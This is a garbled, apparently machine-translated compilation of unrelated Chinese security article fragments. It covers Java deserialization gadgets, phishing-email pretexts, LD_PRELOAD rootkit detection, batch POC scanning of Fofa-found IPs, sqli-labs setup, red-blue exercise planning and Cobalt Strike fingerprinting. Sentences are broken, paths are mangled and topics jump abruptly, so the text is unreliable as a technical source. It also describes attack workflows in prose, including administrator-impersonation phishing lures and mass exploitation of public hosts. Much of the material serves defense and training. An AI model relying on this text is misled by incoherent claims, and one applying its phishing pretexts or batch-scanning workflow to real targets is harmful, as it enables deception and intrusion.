Modifications truthfully reported to the customer that can not be recovered during the post-penetration test phase.

For example, if we want to determine if there is a deserialization, then we can see whether it exists by url dns analysis, to determine whether it is analyzed.

Then refresh the record, log will show the access record, and it is this way we return to determine the successful access.

URL is basically common for java, so the traffic is high.

So how do we serialize the object and let readObject to counterserialize and trigger dnslog.

First, to review the necessary conditions for deserialization, the current Java deserialization vulnerability is because the developer wrote the vulnerability code when rewriting the readObject method.

How to look for the Gadget link here is a complex project, and here I directly analyze the field link in ysoserial.

We now need to look for which method called hashCode() and find HashMap.hash() meets the key in which is not null and will trigger hashCode().

The external approach to HashMap provides the putVal method called in the p u t method.

So now we're combing the whole link: the link: the above link is actually still with a less trigger entry, stay for the later analysis, and first generate serialized data into the file through writeObject.

Then then we will miss the last step to find the trigger point for deserialization, readObject.

In fact, why will go here, here did not comb the theoretical knowledge, keep the later research.

Direct debug debugging to see if HashMap. entered HashMap.readObject()。

When tracing the source of the attacker, it is actually information collection.

Existing tools are actually for information collection, and there are a variety of tools online, but you find that it's all scattered.

Collect subdomain name with subDomainsBrute, Layer, etc., collect whois to open the webmaster's home, collect ip history analysis, and open ip138, etc.

Is there any such a tool, I just tell it which target is, it will output a report, even batch import target, collect information on the target, and portrait the assets.

As far as I know, there seems to be no such tool. If anyone knows the trouble to tell me ~ Since AssetInfoColl doesn't, write one yourself.

So the AssetInfoColl was born.

The input of the AssetInfoColl is targeted, and the output is an asset information collection report.

To go further away, combine the subdomain scanning results of other tools, conduct sensitive file scanning of assets, identify Web services, conduct weak password detection and so on, etc.

Scene app is on HW for me and found a lot of ip attacking us we export ip heavy and throw it to AssetInfoColl.

Fishing mail refers to the disguised email to deceive the recipient to account, password and other information to the designated recipient.

Or guide the recipient to connect to special web pages, usually disguised as a real website, such as a bank or financial website, make the login believe true, input credit card or bank card number, account name and password and stolen.

Social engineering attacks refer to the way of psychologically affecting them, making certain actions, or revealing some confidential information, by legally communicating with others.

This is often regarded as an act of defrauding others to collect information, cheat, and invade computer systems.

It provides the ability to quickly and easily setup and perform phishing activities and security awareness training.

Dovecot is an open-source IMAP and POP3 mail server that supports the Linux/Unix system.

According to a security officer, nearly 70 percent of this year's attack and defense exercises were scored on social engineering attacks.

Fishing email is one of the most commonly used means.

Enterprise safety awareness education and training enterprise safety team plans to carry out safety awareness education and training of all the company, might as well carry out such a phishing email test, I think this is the best training material, can also let employees have a deeper experience and a deeper understanding of safety awareness.

Customers need to test phishing mail on the company's personnel to detect employees' cybersecurity awareness and avoid taking the system from phishing in real attacks.

The attacker disguised as an administrator and asked the victim to click on links in the phishing mail to modify a variety of passwords.

The attacker was disguised as a system administrator and asked the victim to click on a link in a phishing email to thaw the account.

Upgrade patch attacker disguised as a system administrator and let the victim click the attachment upgrade patch in the phishing message.

Information collection uses the epidemic to allow victims to click on links in phishing emails to feedback relevant information.

Holiday gift package attacker disguised as a company employee, asked the victim to click the link in the phishing email to receive the holiday gift package.

System expansion attacker disguised as a system administrator, allowing the victim to click a link in a phishing email to upgrade expansion.

Login exception 8.9. Other 9. Prevention. How to prevent such phishing messages?Take the phishing email in this article as an example, we can identify phishing emails from the following points.

Identify whether the sender's mailbox suffix is the company mailbox suffix right to see whether the link address is a fake address work if receiving a suspicious email, should timely contact the security department or the relevant responsible departments, do not click on the link in the email, download the attachments in the email, running attachments and other dangerous operations.

Disclaimer This article is limited to technology sharing only, and is strictly prohibited for illegal use, otherwise all the consequences will be borne by itself.

Nessus is currently the most widely used system vulnerability scanning and analysis software in the world.

In total, over 75,000 institutions used Nessus as software to scan the agency's computer system.

Dynamic link library preloading mechanism is a way that the system provides users to run a custom dynamic link library, before the executable program can preload the user-defined dynamic link library, this technology can rewrite the system's library function, only need to redefine the preloaded library function in the same name library function, the library function, the redefined function will short circuit the normal library function, this technology can be used to rewrite the system, to achieve the purpose of repairing vulnerabilities.

Compared with the ordinary user space rootkit, the means are more hidden and more difficult to find. Compared with the kernel module rootkit, it has better compatibility and less difficult to write. These two advantages make this type of rootkit increase year by year and difficult to check and kill.

The linux dynamic link library preloading mechanism During the dynamic link library loading on the linux operating system, the dynamic linker reads the value of the LD_PRELOAD environment variable and the default profile / etc/ld.so.The file content of preload and preloads the read dynamic link library even if the program does not rely on these dynamic link libraries, LD_PRELOAD environment variables and / etc/ld.so.The dynamic link libraries specified in the preload configuration file are still loaded, with a higher priority than the link library lookup path defined by the LD_LIBRARY_PATH environment variable, so they can be loaded ahead of the dynamic library called by the user.

Global symbol intervention refers to the application calls the library function, if the library function exists in multiple dynamic link library, that is, the function of the same name, then the linker will only retain the first link function, and ignore the later link function, so as long as the preloaded global symbol in and after the load of the global symbol rename, then the later loaded shared library and the global symbols in the target file.

Because the dynamic link library preloading mechanism and the global symbol intervention in these two system mechanisms, can control the link when the program runs, allow the user to preferentially load the custom dynamic link library before the program runs, make the malicious dynamic link library priority over the normal dynamic link library loading, according to the order principle of the global symbol intervention "short circuit" normal function, execute the attacker defined malicious function.

Pass the malicious dynamic link library through / etc/ld.so.The preload profile is loaded.

Modify the dynamic linker to implement malicious functionality, such as modifying the default profile path / etc/ld. for preloading in the dynamic linkerso.preload customizes the path for the attacker, and then writes the malicious dynamic link library to be loaded inside, of course there are many modified poses, such as modifying the default environment variables to write the hook's dynamic link library directly to the dynamic linker.

If there is a value in LD_PRELOAD, upload the file to a malware detection platform such as virustotal or Microstep Online to detect whether the file is normal, or match homemade features or artificial strings or ida to determine if it is a malicious program.

Clear using the command unset LD_PRELOAD to uninstall the malicious dynamic link library installed using the LD_PRELOAD environment variable.

In the figure below, view / etc/ld. by using the common cat command and the c a t command in busyboxso.preload file content comparison to determine whether there is a pass / etc/ld.so.Malicious dynamic link library loaded by the preload profile files.

Because the malicious dynamic link library has the function of hiding files, the static compiled base command is required to clear. The clearing procedure first clear the top / etc/ld. as shown belowso.The / lib/evil. as viewed in the preload fileThe so file makes it impossible to preload properly and then clear / etc/ld.so.The malicious file content in preload, some malicious dynamic link libraries will modify the hidden permissions of the file, and the ordinary read and write permissions, so you need to look at it, and then clean up, so far the clear is successful.

There are multiple ways to install a modified dynamic linker for malicious function purposes, here using replacing the default preloaded profile / etc/ld. in the dynamic linkerso.The rootkit, of the preload path to achieve a more covert malicious dynamic link library preloading is installed by modifying the profile path / etc/ld. in the dynamic linkerso.preload is the custom path and then writes in that path to the absolute path of the malicious dynamic link library to be preloaded.
Detection the default dynamic linker to achieve the purpose of malicious function will destroy the integrity of the original dynamic linker, we can use the file integrity check to check whether the dynamic linker is modified to first obtain the file path of the dynamic linker in the system, and then judge the integrity of the dynamic linker file.

Here the test system is centos, with rpm verification function. The 5 in the following figure refers to the md5 of the file, and T refers to the modification time.

If you know that the dynamic linker has been modified, you can judge that the dynamic linker has a high security risk, we need to further confirm the modification. If the attacker changes the dynamic linker but implements the malicious function, but modified the default environment variable, or implanted the malicious function directly according to the open source code and recompiles the malicious dynamic linker, then the following detection method may be invalid and need case analysis.

Use the strace command to see if the preloaded profile is / etc/ld.so.preload file, shown below, the preloaded profile for the dynamic link library is / sbin/.XsknPn3F instead of the original configuration file, we can confirm that rootkit in the system modify the dynamic linker to view the file using busybox cat command because the file cannot be viewed using the normal cat command and is hidden by the preloaded library function.

Clearing the rootkit, with the modified dynamic linker needs to replace the modified dynamic linker with the same version of the same system to achieve the purpose of thorough cleaning. The temporary mitigation method is to delete the malicious dynamic link library seen in the above detection process, and to clear the content in the corresponding dynamic link library profile.

According to the dynamic link library preload mechanism, pre-loaded malicious dynamic link library is only effective for the need to use the dynamic library function program, malicious dynamic link library basic function hidden files, according to the characteristics of the hidden file function, so we detect is the application try not to use dynamic library, can avoid the hidden function cross attempt of the file.

View the file under a specific directory using the normal l s command, use a statically compiled base command to view a specific directory file, must see the file / etc/ld.so.preload classic directory / lib / judge whether there are hidden files, emergency response is recommended using busybox, or their own static compiled ls and other commands dynamic link library preload mechanism will read the preload profile content, and then load the corresponding dynamic link library in the profile, according to this feature, you can track the files loaded in the common command execution process, to determine the existence of malicious dynamic link library.

When the executable program is running, you will first access the dynamic link library pre-load configuration file, then read the dynamic library in the corresponding profile, load it pre-loaded, and then load the normal required link library. By tracking the relevant files opened by the system / bin/ls, you can find the pre-loaded configuration file and the preloaded dynamic link library to be found

If the malicious dynamic link library has an anti-strace measure, you can modify the strace name or preload an irrelevant dynamic link library using the LD_PRELOAD environment variable, and then strace tracking, you can bypass the anti-strace measure detected according to the executable program of the malicious dynamic link library name.

Some attackers achieve the purpose of malicious function by modifying the dynamic linker, but this practice will break the integrity of the ring dynamic linker, by detecting the integrity of the dynamic linker can detect the modified dynamic linker type rootkit.

It was also impossible to view the corresponding P I D through netstat, colleagues suspected that the Trojan, but no abnormality was found using rkhunter and other tools, thinking that the situation was the same as in the previous stage, and there was no in-depth analysis and research.

About a month later, my internal colleagues also encountered the same problem and helped deal with it. After learning and analysis, they found that they were completely wrong in thinking, thought it was the PID caused by the kernel problem, and they relied too much on the search results of the tools in the early stage, which was actually caused by the hijacking of library files.

All kinds of pits encountered in the process of disposal and analysis will be synchronized to those who often do emergency response to prevent continuous stepping on the pit in the later stage.

In the early stage, there is a big guy to do an analysis of this case, interested partners can learn, personal feeling summary is very comprehensive.

The application preloads the dynamic link libraries when calling it to the kernel via the system interface, even if the program does not rely on these dynamic link libraries, the LD_PRELOAD environment variables and / etc/ld.so.The dynamic link library specified in the preload configuration file is still loaded.

This library includes two main contents: LD_PRELOAD and / etc/ld.so.preload 。

The LD_PRELOAD is used to preload the environment variables.

/etc/ld.so.The preload is used to preload the profiles.

LD_PRELOAD and / etc/ld. by defaultso.The preload has no configuration.

Dynamic compilation: LD_PRELOAD environment variables and / etc/ld. are loaded regardless of program dependency or the dynamic link libraryso.The dynamic link library specified in the preload configuration file is still loaded.

As you can see above, Linux has two main preloaded configuration files: LD_PRELOAD and / etc/ld.so.So preload,'s library file hijacking for Linux can revolve around both, and there are three main mainstream hijacking techniques.

The second of these is currently the most encountered, mainly through change / etc/ld.so.preload to preload other malicious library files to implement the hijacking of system commands, such as netstat, cat, top, etc., to achieve hidden processes, connections, performance, etc. This is also a typical technology of rootkit.

Generally, the relevant library files are added with hidden properties.

Because it is to load malicious library files by changing the environment variables, you can directly view the environment variables, simple effect is good.

According to Linux's preloading mechanism, the corresponding system commands will load the content specified by the LD_PRELOAD environment variable, so you can be analyzed to track the library files loaded by the corresponding system commands through strace.

This hijacking method is the most common and most mainstream hijacking method currently encountered, mainly to modify its configuration to load a malicious library file to achieve hijacking.

Cannot view the appropriate content by using the cat.

Use busybox to see the corresponding contents of library hijacking.

And its type is modified / etc/ld.so.preload content, and increase malicious library files for hijacking.

Since the cat command is hijacked, we can use the strace to track the loading of the / bin/cat command, and we can see its access / etc/ld.so.preload, and opens the library file / lib/cub3.so file.

Normally, the relevant system function call / etc/ld. by defaultso.preload this library file, but there is also a case where this default library file is modified, so we need to analyze the library file called by default by the relevant system command to analyze if it is modified.

Normally, the default library file called by the relevant system command can be tracked by the strace command.

Below we modify this default library file implementation for hijacking to analyze.

From its official description, the feature is a typical feature of rootkit, with hidden processes, users, networks, backdoor, etc.

Normally, we can see that its default-loaded library is / etc/ld.so.After preload has installed the corresponding malicious program, its default library file is modified to / bin /.Kv8Xqykz, The related default library was modified at this time.

Then delete the / etc/ld. againso.preload is fine.

Direct echo$LD_PRELOAD to see if there is hijacking for environmental variables.

The principle is simple to use system commands to compare with static tools, such as those executed by busybox, and if the results are consistent, there is no hijacking.

If it is inconsistent, there may be a hijacking.

In general, this hijacking for library files is hijacked for all system commands, so we can select any system command by executing system commands against statically executed commands using busybox.

strace can be used to track the corresponding library file loading in a relatively reliable manner.

If you worry that the strace command will be replaced or implanted with the rootkit, you can use busybox to execute the command.

Analyze the LD_PRELOAD environmental variable hijacking.

Since the cat command is hijacked, we can use the strace to track the loading of the / bin/cat command, and we can see its access / etc/ld.so.preload, and opens the library file / lib/cub3.so file.

Tracking with strace sees its default library file being modified to / bin /.Kv8Xqykz, The related default library was modified at this time.

By analyzing the network connection, the same situation was found as in the previous stage, and no PID was seen.

Since mining its CPU will certainly be used a lot, but we use the TOP command, its CPU utilization rate is very low, there is no problem at all.

With the basis of the previous analysis, it is relatively simple to deal with this problem at this time.

Linux library file hijacking can be a headache if you can't deal with the right direction. Understand the principle and techniques to analyze the problem.

Therefore, the disposal is mainly targeted disposal according to the above behavior. The premise of the disposal is to collect specific malicious behaviors, such as which timing tasks were created and which malicious processes were generated.

Someone on the Internet has written the corresponding script, we can refer to the corresponding script when dealing with it, but the process inside may not be the process in the script, the malicious file directory may not be in the script, we need to update and improve it according to the specific situation encountered.

Library file hijacking this technology usually encountered relatively little, but on the freebuf search, was popular since 18 years, usually if there is no such accumulation, after encountering it is still difficult to deal with.

This article is equivalent to blinding everyone, understand its principle will deal with.

In the stage of information collection stage, our main goal is: 1, find the online vulnerability POC2, find out the IP list that may exist. Here I recommend 2 vulnerability libraries that I often visit first.

The Fofa search engine is used to collect the IP with possible vulnerabilities.

Fofa statement: Considering the subsequent need to export the I P list collected by Fofa to the script batch validation, it is easy to use the Github open source tool Fofa-collect. Just configure your Fofa mailbox and API, you can just enter the Fofa syntax, and get the query results.

Write or use POC to find out the original IP P O C link in the IP list can see the vulnerability URL in the run results and has been deposited in urls.At t x t we pick a URL and run with sqlmap to see that there is an injection point.

Actually the article here, can prove the vulnerability exists, but according to my vulnerability box brush public SRC experience, SRC vulnerability need clearly belong to unit, only ip or non-clear unit of domain name is not included, so light IP is not enough, we need to put these loopholes of IP, through IP check domain name, find out the domain name, and find out the domain name unit, so that can be a vulnerability can be submitted.

So there is the next module, batch IP backcheck.

Batch IP domain name check at this stage our main goals are: 1, known urls.There is a vulnerability in the I P in txt, find out the domain names corresponding to these IP, and find the unit where the domain name want to batch IP backcheck the domain name, to find a suitable interface is the first problem to consider.

After the run completes, you can see the result.There are some I P corresponding domain names in txt, and at this time we only need to access the domain name to know the company corresponding to this IP.

So we can take this information to submit vulnerabilities!So far, the whole process is over.

You can see that through a Fofa statement and a POC, we can quickly find a vulnerability that can submit the public welfare SRC in a short time. When we get a new POC, you can only replace the POC_1() function and change the code slightly to realize the batch mining of another vulnerability.

Unfortunately, the POC used in this article was changed based on the P O C provided by the PeiQi library, so it is not original.

Why not use the existing POC batch tools?I have learned that POC-T is a great POC batch validation tool and g o s o n format in goby, which are very efficient and convenient.

But I think I learn a long time, to try to learn from the basic, which needs to write code, understand the logic at the bottom of those tools.

Maybe in the eyes of some big guys, my small project is a suture monster, but I think this is a record of my learning, and I hope to love.

sqli-labs is a target range written by an Indian programmer about SQL injection with a total of 65 levels in which level types have but are not limited to joint query injection, false reporting injection, Boolean blind injection, time lapse blind injection, POST injection, Cookie injection, WAF bypass......As can be seen, the scope is still very wide, very friendly for the side dishes injected into our initial school.

To build our target also requires a precondition, with a web environment first.

phpstduy, is recommended because this software can be very quickly and conveniently to help us configure the environment, save our own time to configure the environment, here to post the official website address of phpstduy, friends in need can directly go to the official website to download.

Download after installed is such a page, here we run MYSQL and NGINX service directly.

Open the database of this module to view our database user name and password, the default is root, the password can be changed, but be sure to remember the modified password, because it needs to be used when configuring the target range.

sqli-labssqli-labs is open source and can be downloaded directly on github: https://github.com/Audi-1/sqli-labs 。

After the download is completed, remove the compressed package directly to the root of our local site.

If you do not know the root location, you can open it directly on phpstduy's web site module.
After the decompression, you need to modify the sqli-labs profile, so that the target range can be connected to our database normally, and the profile is located in sqli-labs/sql-connections/db-creds.inc 。

After opening the profile, you can see several variables, roughly explain, dbuser and dbpass represent the user name and password of the database respectively, host indicates the native ip address, dbname and dbname1 represent the database name, where we want to change the value of dbuser and dbpass to the correct user name and password of our database, note not to fill in the wrong place, otherwise the target range will go wrong.

The status of the modification is shown below. Remember to save the modification.

After the modification is completed, we can access the target site. We directly click on Setup/reset Database for labs, to connect the target site to the database, as shown in the following figure: If the connection is successful, we should see the following picture: Here, we can start a happy journey to the target site.

An incorrect username password in the range profile causes a connection failure.

Check out your php version, and if your php version is 7.x, just modify it to 5.x.

Because after 7. x of php, mysql_connect() is no longer supported, but mysqli_connect(), but the p h p version of our phpstudy may be 7.x by default.

The php version can be modified directly in phpstduy's website module.

If the MYSQL version is too low, there seems to be no information_schema this library, not convenient for later target range testing, so the MYSQL version is recommended above 5.7.

It is best not to use the 127.0.0.1/sqli-labs when visiting the target site, because with 127.0.0.1, when then doing the post type injection, you may not catch the bag.

The workaround is to open the command line and use the ipconfig command to view my intranet ip and the intranet ip to access it like mine is http://192.168.1.163/sqli-labs/.

Open the front desk of the site when the page appears normally with i d values found in the URL header.

Try to join a single quotation to verify an SQL injection vulnerability.

The page was found after adding single quotes.

A wave of database was scanned directly using our SQL injection artifact-SqlMap.

Successfully scanned out of the database.

Continue viewing all of the tables in the database.

I have to see what is in there.

The attack and defense drill suggests that from the perspective of hackers, examine the attack process, and then targeted defense, to prevent the barrel effect, that is, the attacker will only attack from the shortcomings, but the defensive measures built have nothing to do with the shortcomings.

The work recommended to be carried out before the offensive and defense drill before the offensive and defense drill is periodic work, such as once a year, once a month and once a day. It is not recommended to start before the offensive and defense drill.

Attack and defense before the drill is summarized as follows: personnel training unit daily maintenance personnel, in response to increasingly perfect information, software and hardware daily maintenance work, at the same time to improve the coordination of emergency personnel, and the personnel on duty, because during the heavy protection not a unit again, it is relatively difficult to transfer personnel to other units.

Daily operation and maintenance and asset ledger monthly sorting of software and hardware assets: the area of Internet / private network / Intranet port exposure area, old assets.

Coordinate the software developers to self-examine and clean up the characteristics of the general framework exposed to the Internet and software.

Update the information on your hardware and software assets.

Enable the operating system local access log recording function for the system log, application log, and middleware, and save the generated logs for more than 6 months.

Conduct the security inspection for the network, the host, and conduct the targeted optimization and reinforcement.

Risk assessment of the new online business system that does not conduct risk assessment is prohibited from going online.

Security equipment application layer protection policy inspection; network layer of network / security equipment access control inspection.

Check of local access control of operating system; protection policy check of local security software of operating system.

Under conditions and feasibility and operability, the operation baseline can be established and periodic inspection.

Software version vulnerability monthly inspection and tracking of the third-party vulnerability release platform, matching the characteristics of local assets, automating alarm vulnerabilities and vulnerability repair.

Annual logic vulnerability inspection of software finds logic vulnerabilities through code audit, penetration test, and repair.

Annual training for safety awareness training for all the staff; safety technical training for information related personnel of the unit.

Monitoring alarm mechanism Build Intranet monitoring alarm for the availability events of operating system and application system.

Conduct the internal and external network monitoring and alarm for the security events of the operating system and the application system.

Build threat intelligence system, the more threat intelligence source, can input internal threat intelligence at the same time, and can be related according to the intelligence dimension, readable, correlation, suitable for the habits of daily operational personnel, such as threat intelligence system can automatically attack source ip, attack tools, attack traffic characteristics of multi-dimensional correlation to form a higher value of internal threat intelligence.

Construction of emergency response mechanism and annual inspection to formulate special emergency plans for information system safety of specific safety events; according to the plan construction environment, and regularly conduct emergency drills according to specific safety events.

The effectiveness of the Intranet security protection system should be regularly verified. First, all the attention should not be placed on the external assailable area, and the internal assailable area is directly related to the safety of the core system and data.

The second is to prevent a lot of manpower and material resources, the internal net safety protection system is effective without a relatively accurate answer.

Set up an on-site emergency support team for regular events and backstage support experts, as well as dry crowd chat.

Fault-tolerant mechanism construction builds important data, trace operating system local backup mechanism.

Build an important data and trace machine backup mechanism.

Build a remote backup mechanism and a disaster recovery switching mechanism for the business system with high availability.

Check the backup mechanism and periodically.

It is not recommended to use open-source honey tank technology for honey tank secret network construction. Without technical support, it is easy to escape safety events. Any change of information system should be based on security and stability.

The daily operation and maintenance personnel of the unit have good technical conditions, purchased in product form, and skilled in use and customized needs.

The daily operation and maintenance personnel of the unit have poor technical conditions and are purchased in the service form. In addition to the first service, it is recommended to add additional annual periodic and maintenance services. The higher the frequency, the better.

The form depends on the attitude of the unit and the supplier's localization strength and service attitude, it is recommended to buy the original service, prohibit channel service, for example, the person writing the document can dictate the surface and deep meaning of the document, but different documents, there is no standard.

The situation will bring invisible negative impact to the supplier, let the product does not reflect the real application value, nor through the product / service results to the supplier, bring more value, not regular inspection and optimization, attack and defense drill user unit if nobody mentioned to it, may not be able to recall the existence of such a product.

Enabling is impeccable, but encountered by most of the leaders will encounter and very headache problems, that is, the implementation ability of the relevant personnel, and the communication funnel.

The starting meeting of the offensive and defensive drill reflects the attention to all levels to obtain the relevant support resources during the offensive and defense drill; record the meeting minutes, and prepare for the attachment content of the summary report of the offensive and defense drill.

High intensity, high repetition and low error in attack and defense drills is the unique attribute of the work in attack and defense drills.
The leaders on duty will coordinate the superior units, subordinate units, brother units and shift personnel on duty to share defensive information, exchange threat information with the relevant units once during each shift, and the shift personnel will join the local defensive strategy.

Coordinate the background support experts remote standby, keep 24 hours telephone boot, ready to enter the invasion at any time.

If the attack source is the internal net, it will trace to the source until the Internet ip is found, screenshot the network connection status in the security equipment and operating system and then disconnect the network. Before the background support experts will describe the attack path according to the scene, and prohibit other behaviors that destroy the scene from happening.

As the non-attacker themselves, the background support experts will trace the intrusion, give corresponding optimization suggestions, deliver the emergency response report, and the duty leader will report to the superior unit or the referee group.

The on-site duty personnel shall optimize the safety risks and security risks according to the optimization suggestions in the emergency disposal report, coordinate the software developers to repair the security vulnerabilities, and coordinate the penetration and testing personnel to re-test the effectiveness of the vulnerability repair.

The duty leader shall report to the information feedback by the duty personnel to the superior unit or the referee team after evaluation.

Abnormal ip build a new address group at the Internet gateway, all them banned, prohibit domestic network section to prevent the availability of the application system, banned foreign network section to ask for leaders according to the specific situation.

Arrange 2 duty leaders and personnel on duty 24 hours, duty time and duty batch can be adjusted by themselves, but it is necessary to reserve a mobile personnel to deal with emergencies; rich human resources can be on duty 24 hours.

After the inspection of each batch, report the duty results of this batch in the dry group chat. The name of the document of the duty results on that day shall be attached with the date and time to prepare for the preparation of the duty report on the same day.

If the handover time has arrived, the handover personnel shall carry out the duty work of the current shift. The unfinished duty work can not be handed over to the duty personnel of the next shift, and can only leave work after completion.

During the handover of the duty personnel on the same day, briefly report the work results and precautions to the duty leaders and handover personnel on the same day, and deliver all the duty results of the current shift to the handover personnel.

During the handover of the last shift of the duty personnel, record the duty leader on the name of the duty report on the day of the delivery of the duty report is readable.

Repeated work, match the following work content according to the personnel ability, and try to achieve the personnel / object coverage of inspection security / availability event monitoring and alarm system: filtering, event verification, and policy tuning for alarm events.

Check once every 30 minutes when there is no new event.

One person can be arranged for each batch, which can be the same as the task amount; inspection safety protection hardware: filtering, event verification and strategy tuning for protection events. When there is no new event, inspection once every 30 minutes and one person shall be arranged for each batch.
Inspection safety protection software: filtering, event verification and strategy tuning for protection events, conduct inspection 1 time every 1 hour, and arrange personnel with 15 operating systems of each batch.

Conduct inspection for all the new files or specific new files of the specific directory on that day. Inspection is conducted once every 1 hour, and personnel are arranged by 15 operating systems of each batch.

Conduct inspection for all the new files or specific new files of the specific directory on that day. Inspection is conducted once every 1 hour, and personnel are arranged by 15 operating systems of each batch.

Patrol the software and hardware systems not mentioned in this article according to the unit requirements.

After the offensive and defensive drill, there are three defensive achievements after the offensive and defensive drill. Summarize the different defensive success according to the different results, and participate in the defensive ranking according to the defensive score.

Defdefense failed, the core system was broken, and did not participate in the defensive rankings.

Subsequently, the local competent department shall report and inspect the on-site work results of the annual grade protection / risk assessment, and then optimize the reinforcement, and the re-inspection of the competent unit.

As the affiliated unit participated in the performance, the attacking party had the successful invasion results, but the affiliated unit did not find it, and the superior unit conducted internal notification and processing.

The duty leader arranges the defense personnel to prepare the offensive and defense drill, including meeting minutes, daily duty report, emergency response reports and other defense and defensive traces, and review their contents and deliver them to the superior unit after confirmation.

According to the results of the successful defense, after receiving the summary report of the attacking party, compare and optimize the reinforcement report, check whether there are omissions; the duty leader arranges the staff to prepare the meeting materials, launch a summary and analysis meeting, and refine the defensive experience and defense skills.

According to the current situation of defense failure, the guard received the summary report of the attack party, compare and optimize the reinforcement report, and check whether there are omissions.

Duty leader arrangement duty personnel writing meeting materials, a summary analysis meeting, refining the main factors of defense failure, including not limited to human factors, technical factors and software and hardware factors, as well as identify the above factors existing security risks, security risks and security loopholes, synchronous related, this stage can implement the optimization of rectification measures.

Formulate a plan to establish a sound security protection system of the information system simultaneously, and establish a sound process according to the plan and gradually implement it.

All times of the windows file are completely untrustworthy, so the file time is only a reference.

If the offensive and defense paradox, the attack to see, later can only be based on the logical trace association, can not be related traces through direct evidence, but as long as it is running, that is, the representative can find traces and logical connection, if not running, that is, represents no harm need not tension, including will not start the program.

Cobalt Strike acts as a post-penetration tool to complete reconnaissance, harpoon fishing, browser agent and other attacks.

Cobalt Strike is divided into client and server, and the server side is called Team Server.

Team Server is both the controller of Beacon payload and the host where Cobalt Strike provides social worker functions.

Team Server also stores the data collected by Cobalt Strike as well as logging.

The working mode is shown in the following figure: BeaconBeacon is the payload,Beacon of Cobalt Strike running on the target host. We serve on the hidden channel for the long-term control of the infected host.

It works in a similar way to the Metasploit Framework Payload.

During actual penetration, we can embed it into executables, add it to Word documents, or pass on the Beacon. by exploiting a host vulnerability

Beacon features include using HTTP or DNS to check for pending tasks to connect to multiple C2 domain names and automatically migrate tightly integrated with Cobalt Strike after segmented transfer.

Beacon translates into a beacon, like a beacon in the network: " Hey, I'm a broiler, I'm here...”。

You can see how Beacon works in the following figure: After Beacon runs on the target host, it actively sends request information to the Listener we set up in advance.

The Team Server controller receives the request checking for pending tasks and issues them to the Beacon. if any

Beacon Staging Server is worth mentioning that many of the payloading staging, attack frameworks use segmented payload, to prevent the payload from being too large, overwriting the data of the previous function stack frame, resulting in causing exceptions. In addition, to adapt to different attack scenarios, the payload delivery can be carried out in different stages.

Cobalt Strike solves this problem using stager, a really short code that connects to download the real payload and injects it into memory.

The attacker first delivers a compact stager payload, and then goes to stager to some U R L in beacon staging server to download the complete payload.

When the stager server storing the Beacon configuration and payload is exposed to the public web, it is accessible by all.

Unfortunately, access to the service by default is a disguised 404 page.

This also leads to all kinds of scanners, spatial mapping systems, threat intelligence platforms, etc., which can not be effectively judged based on page response information.

Cobalt Strike Server Recognition On February 19,2019, Strategic Cyber LLC released the Cobalt Strike Team Server Population Study.

Part of the aim of the study was to investigate the licensing status of the Cobalt Strike software and to identify and analyze significant changes made to the currently used software version.

The study confirms multiple methods used to identify Cobalt Stike servers in the wild.

The Cobalt Strike server comes with the default security certificate, which you can fingerprint if the hacker is not modified.

The default control port for the Cobalt Strike server is 50050 / TCP, which is basically no other service in use.

In addition, at the end of 2020, the new J A R M fingerprint identifying the TLS service side also provides us with new ideas.

Overall, the most reliable method in the list above is to fingerprint the Cobalt Strike server using the default security certificate.

The remaining detection methods are less uniquely determined and have high confidence only after cross-validation with other methods.

Any server that uses port 50050 and simultaneously provides an H T T P response unique to the NanoHTTP web server is more likely to be a Cobalt Strike server than a server that only displays the HTTP response signature.

Default certificate Cobalt Strike The default certificate is as follows: The default certificate has obvious features.

You can identify whether it is a Cobalt Strike server based on the certificate fingerprint.

The Cobalt Strike server was first released in 2012, based on NanoHTTPD,.

NanoHTTPD is an open-source, w e b, java-based, server framework.

The NanoHTTPD server response contains an additional empty byte: "Behind the HTTP/1.1" is an empty byte (0x20), which does not exist in the other web server responses.

The Cobalt Strike 3.13 version was released on January 2,2019.

The statement released by Cobalt Strike noted that the version removed irrelevant empty bytes from the HTTP status response.

The H T T P responses for all previous version 3.13 Cobalt Strike servers contain this empty byte and can be identified using the scanner to retrieve the HTTP responses.
This extra empty byte is also easily seen by manually grabbing the connection to the Cobalt Strike server.

Since the vast majority of cracked Cobalt Strike s are not updated or patched, the probability of finding malicious Cobalt Strike servers in this method remains large.

Security company Fox-IT released a study on Cobalt Strike servers on February 26,2019, which not only provides details and how to identify previous servers from version 3.13, but also includes a list of over 7,000 Cobalt Strike host I P found from Rapid7 public data using the detection method from 2015 to 2019.

They found fewer servers in ZoomEye's data, but still more than 3,000.

However, they have also subsequently observed that the order in HTTP responses may actually differ, in some Cobalt Strike system responses "Content-Type" shown after "Date".

JARM fingerprint Review the J A 3 fingerprints before introducing JARM.

The open-source J A 3 project, developed by three Salesforce fellows, can detect suspected H T T P S connections by fingerprinting the TLS negotiation between the server and the client.

TLS/SSL version acceptable encryption suite elliptic curve details (such as elliptic curve point format) can be made into fingerprints.

JA3 is used for the client, and JA3S for the server.

In the case of Cobalt Strike, Client beacon and T L S in the negotiation of the Cobalt Strike server running on Kali Linux can produce fingerprints.

These fingerprints require cross-validation to reliably discover Cobalt Strike servers, and although Cobalt Strike servers can partially allow this detection by redirecting, there are still many Cobalt Strike servers that do not use this proxy.

The JA3 and JA3S signatures can be used with tools such as Zeek and Suricata.

Export data from these network detection tools can be input into a S I E M such as Splunk.

The JA3 and JA3S fingerprints are available from Salesforce's Github account and other sources.

JA3Cobalt Strike's default SSL/TLS certificate is fixed, so this certificate is generally used as a feature value to discover the Cobalt Strike server.

These values are then connected in tandem, splitting the fields using "," and "-" to separate the values in each field.

These fields are ordered in the following order: TLS version information, acceptable passwords, extension lists, elliptic curve password, and elliptic curve password format.

Use the CobaltStrike4.1 connection traffic for example.

For example, the above CobaltStrike4.1 client fingerprint: after fa704723a210632b2ff9ad03be418651JA3S creates the JA3, you can fingerprint the TLS service side in the same way, that is, fingerprint the TLS Server Hello information.

JA3S collects decimal byte values for the following fields in the Server Hello package: versions, acceptable encryption algorithms, and extensions, and then connects these values, using "," to separate the fields, and "-" to separate the values from each field.

Although the servers respond differently to different clients, they always respond consistently to the same clients.

The client is sending TLS Client Hello packets where the data are all A.

Therefore, the content of the server will be response is also composed of A, and will always provide the same response with A.

Meanwhile another client is sending packets and all B.

Similarly, the server now responds with B and always with B strings consisting of B.

You can see that the server gives different responses to different clients, but for each client, always corresponding in the same way.

In this log output, JA3 is on the left and JA3S on the right, interacting with the same server four times using the same client.

Then, more than four interactions were performed again using the different clients.

It is not hard to find that the server response is always the same for the same client, but different for different clients.

